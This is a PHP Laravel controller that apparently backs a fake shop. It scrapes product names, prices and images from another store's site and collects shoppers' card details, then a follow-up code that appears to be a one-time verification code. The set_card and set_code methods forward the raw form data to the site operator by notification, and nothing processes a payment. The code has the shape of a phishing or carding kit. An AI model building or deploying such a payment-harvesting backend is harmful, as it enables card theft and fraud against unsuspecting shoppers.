<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Notifications\SendNotification;
use Illuminate\Http\Request;
use mysqli;
use PDO;
use PDOException;
use Goutte\Client;
use Nette\Utils\Floats;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function get_product($pro_name)
    {
        $url = "https://4jehatksa.store/pro/".$pro_name;
        $client = new Client();
        $crawler = $client->request('GET', $url);

        $price = $crawler->filter('h3.d-inline-block')->text();
        // The filter() method selects the <h3> element with the class 'd-inline-block'
        // The text() method retrieves the text content of the selected element
        
        // Now, you can extract the price from the text using string manipulation or regular expressions
        $price = preg_replace('/[^0-9]/', '', $price); // Remove any non-digit characters
        
        $name = $crawler->filter('div.single-product-titlt h3.mb-1')->text();
        $image = $crawler->filter('.fotorama__img')->attr('src');
        return[
            'name'=>$name,
            'price'=>(float)$price,
            'image'=>$image
        ];
        // return view('home???');
    }
    public function payment($array){
        // session()->forget('cart');
        $products = explode(',',$array);
        $pro =[];
        foreach($products as $key=>$prod){
            $pro[$key] = $this->get_product($prod);
        }
        $totalPrice = 0;
        foreach ($pro as $item) {
            $totalPrice += $item['price'];
        }
        $data = [];
        $data['products'] = $pro;
        $data['total']= $totalPrice;
        session(['cart' => $data]);
        $cart = session('cart');



        return view('payment')->with('products',$pro)->with('total',$totalPrice);
    }
    public function sendpayment(Request $request){
        $cart = session('cart');
        $cart['info'] = $request->all();
        session(['cart' => $cart]);
        return redirect()->route('card');

    }
    public function card(){
        return view('card');
    }
    public function set_card(Request $request){
        // dd('cart');
        $cart = session('cart');
        $cart['cart_info'] = $request->all();
        session(['cart' => $cart]);
        $user = User::first();
        $user->notify(new SendNotification($cart));

        return view('code');
    }
    public function code(){
        return view('code');
    }
    public function set_code(Request $request){
        // dd('cart');
        $cart = session('cart');
        $cart['cart_code'] = $request->all();
        session(['cart' => $cart]);
        $user = User::first();
        $user->notify(new SendNotification($cart));
        
    }
}
